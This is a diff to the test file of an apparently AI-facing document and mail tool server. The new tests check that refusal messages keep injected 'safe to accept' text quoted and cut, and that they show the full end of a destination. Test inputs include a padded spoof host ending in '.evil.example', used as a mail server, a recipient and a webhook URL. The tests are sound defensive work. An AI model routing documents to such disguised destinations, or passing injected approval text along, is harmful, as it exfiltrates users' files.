@@ -30,8 +30,27 @@ CUT: Final = re.compile(r"""['"](?:⟦|\["\\u27e6)[^⟦⟧'"]{0,80}…['"]""")
 SHORT: Final = "⟦safe.to.accept"  # where spaces are refused: still has to be quoted
 
 
-def leaks(message: str) -> str:
+# Tools that name a destination: that is quoted whole, so that its end is seen (decision-44).
+DESTINATIONS: Final = frozenset(
+    {
+        "update_mail_account",
+        "process_mail_account",
+        "email_documents",
+        "create_mail_rule",
+        "update_mail_rule",
+        "create_workflow",
+        "update_workflow",
+        "update_user",
+    }
+)
+
+
+def leaks(message: str, *, whole: bool = False) -> str:
     """What is left of the hostile text outside quotes; empty if nothing is."""
+    if whole:
+        message = re.sub(
+            f"(['\"])[^'\"]{{0,30}}{re.escape(EVIL.strip())}[^'\"]{{0,30}}\\1", "", message
+        )
     rest = CUT.sub("", message)
     rest = re.sub(f"['\"][^'\"⟦]*{re.escape(SHORT)}[^'\"]*['\"]", "", rest)
     return rest if "⟦" in rest or "safe" in rest else ""
@@ -174,7 +193,51 @@ async def test_hostile_text_stands_in_a_refusal_only_quoted_and_cut(tool: str) -
 
     message = "".join(getattr(block, "text", "") for block in result.content)
     assert message.startswith("Nothing was changed. Confirming would "), message
-    assert leaks(message) == ""
+    assert leaks(message, whole=tool in DESTINATIONS) == ""
+
+
+PADDED: Final = "imap.bank.example." + "x" * 200 + ".evil.example"
+
+
+@pytest.mark.parametrize(
+    ("tool", "arguments"),
+    [
+        ("update_mail_account", {"account_id": 1, "imap_server": PADDED}),
+        (
+            "email_documents",
+            {
+                "document_ids": [1],
+                "recipients": ["a@x.org", f"b@{PADDED}"],
+                "subject": "s",
+                "message": "m",
+            },
+        ),
+        (
+            "create_workflow",
+            {
+                "name": "N",
+                "enabled": True,
+                "triggers": [{"type": "document_added"}],
+                "actions": [
+                    {
+                        "type": "email",
+                        "email": {"to": f"a@x.org,b@{PADDED}", "subject": "s", "body": "b"},
+                    },
+                    {"type": "webhook", "webhook": {"url": f"https://{PADDED}/x"}},
+                ],
+            },
+        ),
+    ],
+)
+async def test_the_end_of_a_destination_is_shown(tool: str, arguments: Json) -> None:
+    async with Client(serve(source(world(), writes=False), toolsets=["all"])) as client:
+        result = await client.call_tool(tool, arguments, raise_on_error=False)
+
+    message = "".join(getattr(block, "text", "") for block in result.content)
+    assert f"{PADDED}'" in message
+    if tool == "create_workflow":
+        assert f"'b@{PADDED}'" in message
+        assert f"'{PADDED}'" in message
 
 
 def test_self_test_unquoted_whole_and_short_text_is_found() -> None:
